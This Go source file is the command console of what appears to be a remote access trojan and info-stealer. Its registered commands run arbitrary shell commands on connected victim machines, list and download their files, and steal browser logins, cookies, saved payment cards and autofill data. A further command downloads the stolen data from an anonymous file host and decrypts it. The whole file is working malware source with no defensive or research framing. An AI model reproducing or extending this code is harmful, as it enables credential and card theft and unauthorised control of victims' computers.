package main

import (
	"bufio"
	"fmt"
	"github.com/charmbracelet/log"
	"io"
	_ "net"
	"net/http"
	"os"
	"strconv"
	"strings"
)

type Command struct {
	Name           string
	Description    string
	Args           []string
	RequiredClient bool
	Func           func(args []string) error
}

var commands []Command

func (command *Command) Execute(args []string) {
	if command.RequiredClient && (!selectedClient.Connected || (selectedClient.Conn != nil && !connections[selectedClient.Addr].Connected)) {
		log.Errorf("No client selected or client is disconnected!")
		return
	}

	if selectedClient.Conn != nil {
		client := connections[selectedClient.Addr]

		// update every execution because client can disconnect
		if command.RequiredClient && strings.HasPrefix(selectedClient.Addr, client.Addr) {
			selectedClient = client
		}
	}

	err := command.Func(args)
	if err != nil {
		log.Errorf("Failed to execute command: %v", err)
	}
}

func RegisterCommand(name, description string, args []string, requiredClient bool, function func(args []string) error) {
	command := Command{
		Name:           name,
		Description:    description,
		Args:           args,
		RequiredClient: requiredClient,
		Func:           function,
	}
	commands = append(commands, command)
}

func FindCommandByName(name string) (Command, error) {
	for _, command := range commands {
		if command.Name == name {
			return command, nil
		}
	}
	return Command{}, fmt.Errorf("command %s not found", name)
}

func ParseCommand(commandName string, args []string) {
	command, err := FindCommandByName(commandName)
	if err != nil {
		if commandName == "" {
			return
		}
		log.Errorf("Error while parsing command: %v", err)
		return
	}
	if command.Args != nil && len(args) < len(command.Args) {
		log.Errorf("Missing arguments [%s] for command %s", strings.Join(command.Args[len(args):], ", "), commandName)
		return
	}
	command.Execute(args)
}

func CommandLine() {
	scanner := bufio.NewScanner(os.Stdin)
	for {
		scanner.Scan()
		userInput := scanner.Text()
		if strings.HasPrefix(userInput, "/") {
			userInput = userInput[1:]
			split := strings.Split(userInput, " ")

			commandName := split[0]
			commandArgs := split[1:]

			ParseCommand(commandName, commandArgs)
		}
	}
}

func RegisterCommands() {
	RegisterCommand("help", "Prints help", []string{}, false, func(args []string) error {
		log.Infof("Available commands:")
		for _, command := range commands {
			if len(command.Args) == 0 {
				log.Infof("/%s - %s", command.Name, command.Description)
			} else {
				displayArgs := func(commandArgs []string) string {
					text := ""
					for _, arg := range commandArgs {
						text += "[" + arg + "] "
					}
					return text[:len(text)-1]
				}
				log.Infof("/%s %s - %s", command.Name, displayArgs(command.Args), command.Description)
			}
		}
		return nil
	})
	RegisterCommand("exit", "Exits the program", []string{}, false, func(args []string) error {
		log.Info("Exiting...")
		os.Exit(0)
		return nil
	})
	RegisterCommand("cmd", "Executes a command", []string{"command"}, true, func(args []string) error {
		selectedClient.SendData("cmd " + strings.Join(args, " "))
		return nil
	})
	RegisterCommand("connections", "Lists all connections", []string{}, false, func(args []string) error {
		if len(connections) == 0 {
			log.Infof("No connections")
			return nil
		}

		index := 0
		for _, connection := range connections {
			var status string
			if connection.Connected {
				status = "connected"
			} else {
				status = "disconnected"
			}

			log.Infof("[%s] Connection: %s | Status: %s", strconv.Itoa(index), connection.Addr, status)
			index++
		}
		return nil
	})
	RegisterCommand("files", "Lists all files in the current directory", []string{"directory"}, true, func(args []string) error {
		selectedClient.SendData("files " + args[0])
		return nil
	})
	RegisterCommand("download", "Downloads a file", []string{"file"}, true, func(args []string) error {
		selectedClient.SendData("download " + args[0])
		return nil
	})
	RegisterCommand("select", "Selects a connection", []string{"connection"}, false, func(args []string) error {
		index, err := strconv.Atoi(args[0])
		if err != nil || index < 0 || index >= len(connections) {
			return fmt.Errorf("invalid connection index")
		}

		i := 0
		for s := range connections {
			if i != index {
				i++
				continue
			}

			if connections[s].Connected == false {
				return fmt.Errorf("connection is not connected")
			}

			selectedClient = connections[s]
			log.Infof("Selected connection %s", selectedClient.Addr)
			_, _ = SetTitle("Selected connection: " + selectedClient.Addr)
		}

		return nil
	})
	RegisterCommand("clear", "Clears the screen", []string{}, false, func(args []string) error {
		CallClear()
		return nil
	})
	RegisterCommand("steal", "Steal browser data", []string{"login, cookies, cards, autofill"}, true, func(args []string) error {
		selectedClient.SendData("steal " + args[0])
		return nil
	})
	RegisterCommand("decrypt", "Decrypt response browser data", []string{"url(only anon-files)", "filename", "password"}, false, func(args []string) error {
		arg := args[0]
		if IsUrl(arg) {
			request := MakeRequest(arg)
			url := ExtractDownloadLink(request)

			// Make the GET request
			response, err := http.Get(url)
			if err != nil {
				return err
			}
			defer response.Body.Close()

			// Check the status code of the response
			if response.StatusCode != http.StatusOK {
				return err
			}

			filePath := GetExecutablePath() + "\\" + args[1]

			// Create the local file to save the downloaded content
			file, err := os.Create(filePath)
			if err != nil {
				return err
			}
			defer file.Close()

			// Copy the content from the response body to the local file
			_, err = io.Copy(file, response.Body)
			if err != nil {
				return err
			}

			log.Infof("File downloaded and saved to: %s", filePath)

			fileBytes, err := os.ReadFile(filePath)
			if err != nil {
				return err
			}

			data, err := DecryptData(fileBytes, args[2])
			if err != nil {
				return err
			}
			ClearFile(filePath)

			err = os.WriteFile(filePath, data, 0644)
			if err != nil {
				return err
			}

			log.Infof("Successfully decrypted file: %s", filePath)
		}
		return nil
	})
}
